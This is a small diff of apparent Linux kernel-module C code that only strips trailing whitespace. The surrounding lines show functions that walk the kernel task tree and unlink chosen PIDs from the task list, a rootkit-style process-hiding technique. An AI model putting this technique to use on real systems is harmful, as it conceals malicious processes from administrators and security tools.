@@ -61,7 +61,7 @@ void hide_processes_traverse_tree(struct task_struct* root_task){
         // now the next task
         next = list_entry(task->sibling.next, struct task_struct, sibling);
         task = next;
-    } 
+    }
 }
 
 void hide_processes(void){
@@ -82,7 +82,7 @@ int i;
         if (task->pid > 0){ // somethin has 0, which shall not be taken into consideration
             hide_processes_traverse_tree(task);
         }
-        // the following routine seems to correctly 
+        // the following routine seems to correctly
         // remove elements from the tasks list
         for (i=0; i<pids_count; ++i){
             if (task->pid == pids_to_hide[i]){
